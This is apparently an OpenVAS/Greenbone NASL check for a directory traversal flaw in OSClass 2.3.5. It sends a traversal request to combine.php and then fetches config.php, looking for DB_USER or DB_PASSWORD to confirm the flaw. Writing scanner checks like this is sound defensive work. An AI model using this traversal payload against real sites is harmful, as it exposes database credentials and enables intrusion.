if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103446" );
	script_bugtraq_id( 52336 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "OSClass Directory Traversal and Arbitrary File Upload Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52336" );
	script_xref( name: "URL", value: "http://osclass.org/2012/03/05/osclass-2-3-6/" );
	script_xref( name: "URL", value: "http://osclass.org/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521902" );
	script_xref( name: "URL", value: "http://www.codseq.it/advisories/osclass_directory_traversal_vulnerability" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-03-08 11:53:08 +0100 (Thu, 08 Mar 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "OSClass is prone to a directory-traversal vulnerability and an arbitrary-file-
upload vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to obtain sensitive information
and to upload arbitrary code and run it in the context of the
webserver process." );
	script_tag( name: "affected", value: "OSClass 2.3.5 is vulnerable, prior versions may also be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/osclass", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(IsMatchRegexp( buf, "This website is proudly using the.*OSClass" ) || ContainsString( buf, "generator\" content=\"OSClass" )){
		url = dir + "/oc-content/themes/modern/combine.php?type=./../../../combine.php&files=combine.php";
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && ContainsString( buf, "<?php" )){
			url = dir + "/combine.php?files=config.php";
			req = http_get( item: url, port: port );
			buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			if(ContainsString( buf, "DB_USER" ) || ContainsString( buf, "DB_PASSWORD" )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

